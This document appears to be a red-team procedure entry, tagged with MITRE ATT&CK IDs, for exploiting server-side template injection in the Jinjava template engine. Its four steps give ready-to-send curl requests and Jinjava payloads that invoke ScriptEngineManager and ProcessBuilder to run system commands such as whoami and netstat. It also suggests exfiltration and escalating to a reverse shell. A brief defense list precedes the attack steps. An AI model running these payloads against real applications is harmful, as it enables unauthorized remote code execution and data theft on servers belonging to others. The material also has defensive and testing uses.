---
id: ea86aada-3a2c-4280-a94c-2c6f20a27c9e
name: Jinjava-SSTI-Command-Execution
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:39.966388+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques:
  - '[[sub-techniques/JavaScript|T1059.007 - JavaScript]]'
tags:
  - '[[tags/Jinjava]]'
  - '[[tags/SSTI]]'
  - '[[tags/RCE]]'
  - '[[tags/Server-Side-Template-Injection]]'
commands:
  - '[[commands/curl-inject-jinjava-payload]]'
platforms:
  - Web
  - Java
tools: []
validated: true
---

# Jinjava-SSTI-Command-Execution

## Summary

This procedure exploits Server-Side Template Injection (SSTI) in Jinjava, a Java-based template engine often used in applications like HubSpot, to achieve remote code execution (RCE) by injecting payloads that leverage the Java ScriptEngineManager to execute arbitrary system commands via JavaScript eval.

## Description

Jinjava processes user-controlled input as templates, allowing attackers to inject malicious expressions that invoke Java's scripting capabilities. By accessing the ScriptEngineManager, an attacker can create a JavaScript engine instance and use it to instantiate ProcessBuilder objects, enabling the execution of OS commands. This technique is particularly effective against web applications where user input (e.g., form fields, URL parameters) is rendered through Jinjava without proper sanitization. Successful exploitation leads to command execution on the server, potentially resulting in data exfiltration, persistence, or lateral movement. The target environment typically involves a Java web application (e.g., on Tomcat or Spring) with Jinjava integration.

## Requirements

1. User input point that feeds into a Jinjava template renderer (e.g., a search field, profile description, or dynamic content area).
2. Network access to the vulnerable web application.
3. Knowledge of the application's input processing flow to identify injection points.
4. A tool like Burp Suite for intercepting and modifying requests (optional but recommended for testing).

## Defense

- Sanitize and validate all user inputs to Jinjava templates, using whitelisting for allowed characters and expressions.
- Disable or restrict scripting engines in Java applications by configuring security managers to block ScriptEngineManager access.
- Implement a Web Application Firewall (WAF) with rules to detect SSTI patterns, such as '{{' sequences or Java class invocations.
- Regularly audit and update Jinjava and dependent libraries to patch known vulnerabilities.
- Enable application logging for template rendering errors and monitor for anomalous command executions (e.g., via process monitoring on the server).

## Objectives

1. Inject a malicious Jinjava payload to invoke the JavaScript engine.
2. Execute arbitrary system commands on the server using ProcessBuilder.
3. Retrieve command output to confirm RCE and gather further intelligence.

## Instructions

### Step 1: Identify Injection Point

**Context**: Locate a user-controlled input that is processed by Jinjava, such as a form field or query parameter. Test for SSTI by injecting a benign payload like '{{7*7}}' and checking if the output reflects '49' instead of literal text.

Use [[commands/curl-inject-jinjava-payload]] to send a test request:

```bash
curl -X POST http://target.com/vulnerable-endpoint -d "input={{7*7}}" -v
```

> This step verifies if the application evaluates Jinjava expressions. If the response contains '49', SSTI is confirmed.

### Step 2: Inject Basic Script Engine Access

**Context**: Once SSTI is confirmed, inject a payload to access the Java ScriptEngineManager and execute a simple JavaScript statement, such as creating a string object, to validate engine invocation without triggering alerts.

Reference the payload from [[codes/Jinjava-SSTI-Command-Execution-Payload]] for the basic test:

```jinjava
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("new java.lang.String('xxx')")}}
```

Use [[commands/curl-inject-jinjava-payload]] to submit it:

```bash
curl -X POST http://target.com/vulnerable-endpoint -d "input={{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}" -v
```

> Expected behavior: The template renders without errors, indicating successful engine access. If an exception occurs (e.g., class not found), adjust the payload for the environment.

### Step 3: Execute System Command

**Context**: Escalate to command execution by using the engine to create a ProcessBuilder instance and run a reconnaissance command like 'whoami'. Capture the output using IOUtils if available in the classpath.

Use the command execution variant from [[codes/Jinjava-SSTI-Command-Execution-Payload]]:

```jinjava
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"whoami\"); x.start(); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())").toString()}}
```

Submit via [[commands/curl-inject-jinjava-payload]]:

```bash
curl -X POST http://target.com/vulnerable-endpoint -d "input={{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}" -v
```

> This runs 'whoami' and attempts to display the output in the response. If IOUtils is unavailable, the process starts silently; chain with output redirection for exfiltration.

### Step 4: Chain Multiple Commands and Verify

**Context**: Test additional commands (e.g., 'netstat', 'uname -a') to gather system information. If output capture fails, use file write or network exfiltration for retrieval.

Adapt payloads from [[codes/Jinjava-SSTI-Command-Execution-Payload]] for each:

For 'netstat':

```jinjava
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"netstat\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())").toString()}}
```

Submit and observe the response for network connections or system details.

> Success is indicated by command output appearing in the rendered template or server-side effects (e.g., log entries). Escalate by writing a reverse shell script to disk and executing it.
